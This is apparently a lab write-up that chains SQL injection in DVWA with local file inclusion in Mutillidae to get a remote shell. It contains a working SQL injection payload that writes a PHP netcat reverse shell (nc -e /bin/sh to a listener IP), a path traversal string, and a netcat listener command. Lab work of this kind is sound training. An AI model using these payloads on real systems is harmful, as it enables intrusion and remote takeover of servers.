We first used the vulnerable SQL Injection functionality in DVWA to determine whether data could be written to the server. Although direct file creation within the web root directory (`/var/www`) was not permitted, the database server had sufficient permissions to create files within the temporary directory (`/tmp`).

The following payload was used through the SQL Injection page:

```sql
' union select '<?passthru("nc -e /bin/sh 172.16.219.133 8080");?>',null into outfile '/tmp/reverse.php'
```

To perform this test:

1. Log in to DVWA.
2. Navigate to the SQL Injection module.
3. Use `-1` as the ID value.
4. Append the payload shown above.

After execution, the application confirmed that the file had been successfully written to the server and stored in the temporary directory. At this stage, we knew the file existed on the system, but we could not execute it directly because writing to `/var/www` was not allowed.

<img width="1440" height="350" alt="Screenshot 2026-06-23 at 5 04 44 PM" src="https://github.com/user-attachments/assets/5936247a-751c-470a-9479-b639a63bff49" />


 Step 2: Identifying a Local File Inclusion (LFI) Vulnerability

Next, we identified a Local File Inclusion (LFI) vulnerability on the same server. The vulnerability allowed files to be requested from locations outside the application's normal web directories.


Since the file had already been written to `/tmp`, we used the following path traversal sequence to access it:

```text
../../../../../tmp/reverse.php
```

By accessing the file through the LFI vulnerability, we demonstrated how a file created through SQL Injection could be reached and executed even when direct access from the web root was not possible.

<img width="1326" height="734" alt="Screenshot 2026-06-23 at 5 07 26 PM" src="https://github.com/user-attachments/assets/4ee0fc91-9e7e-4dfd-a986-bd1b432ee60b" />

<img width="1204" height="419" alt="Screenshot 2026-06-23 at 5 15 22 PM" src="https://github.com/user-attachments/assets/caf6bc85-bccd-4d24-98b1-faef1cdc6130" />


 Step 3: Accessing the File Through Mutillidae

After completing the SQL Injection portion in DVWA, we logged in to Mutillidae and navigated to:

```text
OWASP Top 10 → Security Misconfiguration → Direct Browsing
```

Using the same file inclusion technique, we supplied:

```text
../../../../../tmp/reverse.php
```

At the same time, a Netcat listener was running:

```bash
nc -lnvp 8080
```

Once the file was accessed through the vulnerable page, a connection was received on the listener, demonstrating remote access through the chained vulnerabilities.

<img width="1440" height="807" alt="Screenshot 2026-06-23 at 5 17 07 PM" src="https://github.com/user-attachments/assets/e1a76649-f935-492e-a9de-0bb80d14c832" />


<img width="1440" height="536" alt="Screenshot 2026-06-23 at 5 17 28 PM" src="https://github.com/user-attachments/assets/63256784-6ccb-4837-a656-a0a88d32d21c" />

 Key Takeaways

 Individual vulnerabilities may appear limited on their own.
 Attackers often combine multiple weaknesses to achieve a greater impact.
 SQL Injection can sometimes allow file creation, depending on database permissions.
 Local File Inclusion can allow access to files stored outside the web root.



